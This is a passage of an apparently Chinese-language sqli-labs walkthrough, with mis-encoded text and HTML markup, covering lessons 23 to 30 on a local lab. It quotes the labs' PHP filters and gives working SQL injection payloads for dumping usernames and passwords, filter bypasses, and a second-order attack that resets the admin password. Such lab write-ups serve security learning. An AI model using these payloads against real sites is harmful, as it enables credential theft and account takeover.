å°è¯•è¿›è¡Œé—­åˆï¼ˆæ³¨é‡Šè¢«æ›¿æ¢æˆä¸ºç©ºï¼‰<br>?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>) <span class="hljs-keyword">and</span> &#x27;<span class="hljs-number">1</span><br><br># å›½å…‰å¤§å¸ˆå‚…çš„Payloadï¼š<br>?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,(<span class="hljs-constructor">SELECT(@<span class="hljs-params">x</span>)</span><span class="hljs-constructor">FROM(SELECT(@<span class="hljs-params">x</span>:=0x00)</span> ,(<span class="hljs-constructor">SELECT(@<span class="hljs-params">x</span>)</span><span class="hljs-constructor">FROM(<span class="hljs-params">users</span>)</span><span class="hljs-constructor">WHERE(@<span class="hljs-params">x</span>)</span><span class="hljs-constructor">IN(@<span class="hljs-params">x</span>:=CONCAT(0x20,@<span class="hljs-params">x</span>,<span class="hljs-params">username</span>,<span class="hljs-params">password</span>,0x3c62723e)</span>)))x),<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> <span class="hljs-character">&#x27;1&#x27;</span>=&#x27;<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$id=$_GET[<span class="hljs-string">&#x27;id&#x27;</span>];<br><br><span class="hljs-comment">//filter the comments out so as to comments should not work</span><br>$reg = <span class="hljs-string">&quot;/#/&quot;</span>;<br>$reg1 = <span class="hljs-string">&quot;/--/&quot;</span>;<br>$replace = <span class="hljs-string">&quot;&quot;</span>;<br>$id = preg_replace($reg, $replace, $id);<br>$id = preg_replace($reg1, $replace, $id);<br><br></code></pre></td></tr></table></figure><p>æ­£å¦‚æºç æ‰€ç¤ºï¼Œå°† # å’Œ â€“ æ›¿æ¢ä¸ºç©ºï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨é—­åˆçš„æ–¹å¼è¿›è¡Œæ³¨å…¥ã€‚</p><hr><h2 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h2><p>å…³é”®è¯ï¼šç»å…¸äºŒæ¬¡æ³¨å…¥ã€å­˜å‚¨æ³¨å…¥</p><p>äºŒæ¬¡æ³¨å…¥é€šå¸¸åœ¨æ³¨å†Œçš„ä½ç½®ï¼Œæ’å…¥æ•°æ®çš„æ—¶å€™ä¸ä¼šäº§ç”Ÿé”™è¯¯ä¿¡æ¯ï¼Œä½†æ˜¯åœ¨æ‰§è¡Œå…¶ä»–è¯­å¥çš„æ—¶å€™å‘ç”Ÿäº†é”™è¯¯ã€‚<br>ï¼ˆç¬¬ä¸€æ¬¡æ˜¯å‘æ•°æ®åº“æ’å…¥Payloadï¼Œç¬¬äºŒæ¬¡æ˜¯åˆ©ç”¨Payloadï¼‰</p><p>Updateè¯­å¥</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>UPDATE<span class="hljs-built_in"> users </span><span class="hljs-builtin-name">SET</span> <span class="hljs-attribute">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;$username&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27;$curr_pass&#x27;</span><br><br></code></pre></td></tr></table></figure><p>å½“ç”¨æˆ·åä¸º adminâ€™# æ—¶ï¼Œsql è¯­å¥ä¼šå˜æˆ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>UPDATE<span class="hljs-built_in"> users </span><span class="hljs-builtin-name">SET</span> <span class="hljs-attribute">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;admin&#x27;</span># <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27;$curr_pass&#x27;</span><br><br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±ä¼šä¿®æ”¹ admin çš„å¯†ç ï¼Œè€Œä¸æ˜¯æˆ‘è‡ªå·±æ³¨å†Œçš„è´¦å·ã€‚</p><p>é€šè¿‡è¿™ä¸ªé¡µé¢ <a href="http://localhost:4000/Less-24">http://localhost:4000/Less-24</a> è¿›å…¥æ³¨å†Œé¡µé¢å¤±è´¥ï¼Œå‘ç°æ˜¯æ–‡ä»¶è·¯å¾„æœªæ‰¾åˆ°ã€‚åœ¨åé¢å¡«åŠ  index ä¹‹åå°±æ­£å¸¸æ‰§è¡Œäº†ï¼Œå³è®¿é—®ï¼š<a href="http://localhost:4000/Less-24/index.php%E3%80%82">http://localhost:4000/Less-24/index.phpã€‚</a></p><p>æ³¨å†Œæ–°ç”¨æˆ·<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/5B29A116-C50E-4DB1-A821-6345CC7FB629.png"><br>åœ¨ä¿®æ”¹é¡µé¢è¿›è¡Œå¯†ç ä¿®æ”¹ï¼Œå³å¯ä¿®æ”¹ admin çš„å¯†ç ã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/8EBA386F-FB14-45C1-AE56-1D196A017E6B.png"></p><hr><h2 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=&#39;$id&#39;</code></p><p>å…³é”®è¯ï¼šGET ç±»å‹ã€è¿‡æ»¤ and+orã€‚</p><p>å…³é”®ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params">$id</span>)</span><br><span class="hljs-function"></span>&#123;<br>    $id= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);            <span class="hljs-comment">//strip out OR (non case sensitive)</span><br>    $id= preg_replace(<span class="hljs-string">&#x27;/AND/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);        <span class="hljs-comment">//Strip out AND (non case sensitive)</span><br>    <br>    <span class="hljs-keyword">return</span> $id;<br>&#125;<br><br>$id= blacklist($id);<br>$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ or å’Œ and åªè¢«æ›¿æ¢äº†ä¸€æ¬¡ï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨åŒå†™ç»•è¿‡ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># è”åˆæ³¨å…¥ Payload</span><br>?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(username,passwoorrd+SEPARATOORR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span>)<span class="hljs-comment">--+</span><br><span class="hljs-comment"># å…¶ä¸­ password æ”¹ä¸º passwoordï¼Œseparator æ”¹ä¸º separatoorrï¼ˆè®¾ç½®åˆ†éš”ç¬¦ï¼‰ï¼Œ0x3c62723e æ˜¯åå…­è¿›åˆ¶çš„&lt;br&gt;</span><br><br></code></pre></td></tr></table></figure><p>and å¯ä»¥ä½¿ç”¨ &amp;&amp; æ›¿æ¢ï¼Œor ä½¿ç”¨ || æ›¿æ¢</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br># æŠ¥é”™æ³¨å…¥Payload<br>?id=<span class="hljs-number">1</span>&#x27;||extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,database()))--+<br>?id=<span class="hljs-number">1</span>&#x27;||extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(SELECT+GROUP_CONCAT(username,passwoorrd+SEPARATOORR+<span class="hljs-number">0x3c62723e</span>)+FROM+users)))--+<br><br></code></pre></td></tr></table></figure><h2 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=&#39;$id&#39;</code></p><p>å…³é”®è¯ï¼šæŠ¥é”™æ³¨å…¥ã€è¿‡æ»¤ç©ºæ ¼å’Œæ³¨é‡Šç¬¦ã€è¿‡æ»¤ and å’Œ orã€å•å¼•å·</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-comment"># è¿‡æ»¤äº† or å’Œ and å¤§å°å†™</span><br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-regexp">//</span>strip out OR (non case sensitive)<br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/and/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-regexp">//</span>Strip out AND (non case sensitive)<br><br><br><span class="hljs-comment"># è¿‡æ»¤äº† /*</span><br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-regexp">//</span>strip out /*<br><br><br><span class="hljs-comment"># è¿‡æ»¤äº† -- å’Œ # æ³¨é‡Š</span><br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-regexp">//</span>Strip out --<br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-regexp">//</span>Strip out <span class="hljs-comment">#</span><br><br><br><span class="hljs-comment"># è¿‡æ»¤äº†ç©ºæ ¼</span><br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\s]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-regexp">//</span>Strip out spaces<br><br><br><span class="hljs-comment"># è¿‡æ»¤äº†æ–œçº¿</span><br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-regexp">//</span>Strip out slashes<br>return <span class="hljs-variable">$id</span>;<br><br></code></pre></td></tr></table></figure><ul><li>è¿‡æ»¤ or å’Œ andï¼šå¯ä»¥ç”¨ &amp;&amp; å’Œ || æ›¿æ¢æˆ–è€…é‡‡ç”¨åŒå†™çš„æ–¹å¼ç»•è¿‡</li><li>è¿‡æ»¤ç©ºæ ¼ï¼šå¯ä»¥ç”¨ä¸‹è¡¨çš„å­—ç¬¦è¿›è¡Œæ›¿æ¢<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haml"><br><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span> TAB é”®(æ°´å¹³) <br><span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span> æ–°å»ºä¸€è¡Œ <br><span class="hljs-tag">%<span class="hljs-selector-tag">0c</span></span> æ–°çš„ä¸€é¡µ <br><span class="hljs-tag">%<span class="hljs-selector-tag">0d</span></span> return åŠŸèƒ½ <br><span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span> TAB é”®(å‚ç›´) <br><span class="hljs-tag">%<span class="hljs-selector-tag">a0</span></span> ç©ºæ ¼ <br><br></code></pre></td></tr></table></figure></li><li>è¿‡æ»¤æ³¨é‡Šï¼šå¯ä»¥ç”¨ä¸¤ä¾§é—­åˆæ–¹å¼ç»•è¿‡ã€‚ä¾‹å¦‚ï¼šless-23<br>å¯ä»¥æ„å»º Payload å¾—ï¼š<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br># æµ‹è¯•æ˜¯å¦å¯ä»¥æ‰§è¡Œ<br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>sleep(<span class="hljs-number">3</span>)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br># å…¶ä¸­%<span class="hljs-number">26</span>æ˜¯&amp;ï¼Œä½¿ç”¨ä¸¤ä¾§é—­åˆæ–¹å¼ç»•è¿‡æ³¨é‡Š<br><br># æŠ¥é”™æ³¨å…¥Payload<br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,database()))%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure></li></ul><hr><h2 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=(&#39;$id&#39;)</code></p><p>å…³é”®è¯ï¼šç›²æ³¨ã€å¸ƒå°”æ³¨å…¥ã€å»¶æ—¶æ³¨å…¥</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?id=<span class="hljs-number">1</span><br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br># è¿”å›ç»“æœç›¸åŒï¼ŒæˆåŠŸé—­åˆSQLè¯­å¥<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=(&#39;$id&#39;)</code></p><p>å…³é”®è¯ï¼šåŸºäºé”™è¯¯ã€è¿‡æ»¤ Union å’Œ Select</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br># æµ‹è¯•èƒ½å¦é—­åˆ<br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>sleep(<span class="hljs-number">3</span>)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><ul><li>è¿‡æ»¤ Union å’Œ selectï¼šé‡‡ç”¨åŒå†™ç»•è¿‡ï¼ˆåŸç†åŒ or å’Œ andï¼‰ã€é‡‡ç”¨å¤§å°å†™æ··åˆç»•è¿‡ï¼ˆMySQLå¯¹å¤§å°å†™å¹¶ä¸æ•æ„Ÿï¼‰<br>å…³é”®ä»£ç ï¼š<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment"># è¿‡æ»¤äº† /*</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><span class="hljs-comment"># è¿‡æ»¤äº† -</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><span class="hljs-comment"># è¿‡æ»¤äº† #</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><span class="hljs-comment"># è¿‡æ»¤äº†ç©ºæ ¼</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><span class="hljs-comment"># è¿‡æ»¤äº† select /m ä¸¥æ ¼æ¨¡å¼ ä¸å¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/select/m&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br>$id= preg_replace(<span class="hljs-string">&#x27;/select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br>$id= preg_replace(<span class="hljs-string">&#x27;/Select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br>$id= preg_replace(<span class="hljs-string">&#x27;/SELECT/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><br><br><span class="hljs-comment"># è¿‡æ»¤äº† union UNION</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br>$id= preg_replace(<span class="hljs-string">&#x27;/Union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br>$id= preg_replace(<span class="hljs-string">&#x27;/UNION/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><span class="hljs-keyword">return</span> $id;<br><br></code></pre></td></tr></table></figure>è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼ˆç±»ä¼¼ less-26ï¼‰<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br># æŠ¥é”™æ³¨å…¥ Payload<br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database()))%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, seleselectct database()))%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure></li></ul><hr><h2 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=&quot;$id&quot;</code></p><p>åŒ less-27ï¼Œé—­åˆæ–¹å¼ä¸åŒã€‚æ²¡æœ‰è¾“å‡ºæŠ¥é”™ä¿¡æ¯ï¼Œæ‰€ä»¥ä¸èƒ½æŠ¥é”™æ³¨å…¥ã€‚å…³é”®ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$id = <span class="hljs-string">&#x27;&quot;&#x27;</span> .$id. <span class="hljs-string">&#x27;&quot;&#x27;</span>;<br>$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1&quot;</span>;<br><br></code></pre></td></tr></table></figure><p>å°è¯•æ³¨å…¥</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><span class="hljs-comment"># æµ‹è¯•é—­åˆæƒ…å†µ</span><br>?id=<span class="hljs-number">1</span>%26%261<br><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&quot;%26%26sleep(3)%26%26&quot;</span><span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><h2 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=(&#39;$id&#39;)</code> </p><p>å…³é”®è¯ï¼šåŸºäºé”™è¯¯ã€è¿‡æ»¤ Union å’Œ Selectã€å•å¼•å·+æ‹¬å·<br>å…³é”®ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment"># è¿‡æ»¤ /*</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><br><br><span class="hljs-comment"># è¿‡æ»¤ - # æ³¨é‡Š</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br>$id= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><br><br><span class="hljs-comment"># è¿‡æ»¤ ç©ºæ ¼ +</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);.<br><br><br><span class="hljs-comment"># è¿‡æ»¤ union select /i å¤§å°å†™éƒ½è¿‡æ»¤</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><span class="hljs-keyword">return</span> $id;<br><br></code></pre></td></tr></table></figure><p>è¿‡æ»¤ union select /i å¤§å°å†™éƒ½è¿‡æ»¤ï¼šåªèƒ½é‡‡ç”¨åŒå†™çš„æ–¹å¼è¿›è¡Œæ³¨å…¥</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br># æµ‹è¯•SQLè¯­å¥æ˜¯å¦æ‰§è¡Œ<br> ?id=<span class="hljs-number">1</span>&#x27;)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>sleep(<span class="hljs-number">3</span>)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>(&#x27;<span class="hljs-number">1</span><br><br># å»¶æ—¶æ³¨å…¥Payload<br>?id=<span class="hljs-number">1</span>&#x27;)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>if(database()=&#x27;security&#x27;, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>(&#x27;<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=(&#39;$id&#39;)</code></p><p>å…³é”®ä»£ç ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-keyword">function</span> blacklist(<span class="hljs-variable">$id</span>)<br>&#123;<br><span class="hljs-regexp">//</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>strip out /*<br><span class="hljs-regexp">//</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>Strip out --.<br><span class="hljs-regexp">//</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>Strip out <span class="hljs-comment">#.</span><br><span class="hljs-regexp">//</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>Strip out spaces.<br><span class="hljs-regexp">//</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/select/m&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>Strip out spaces.<br><span class="hljs-regexp">//</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>Strip out spaces.<br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>Strip out spaces.<br>return <span class="hljs-variable">$id</span>;<br>&#125;<br><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;</span>;<br><br></code></pre></td></tr></table></figure><p>æµ‹è¯• Payloadï¼š</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><br><span class="hljs-comment"># é—­åˆ SQL</span><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"># è”åˆæ³¨å…¥ Payloadï¼ˆå›½å…‰å¤§ä½¬çš„ payload æµ‹è¯•å¤±è´¥ï¼‰</span><br><span class="hljs-string">?id=0&#x27;</span>) <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1, 2, 3--+</span><br><br></code></pre></td></tr></table></figure><h2 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=&#39;$id&#39;</code></p><p>å…³é”®è¯ï¼šGETã€åŸºäºé”™è¯¯ã€WAF</p><p>index.php å…³é”®ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 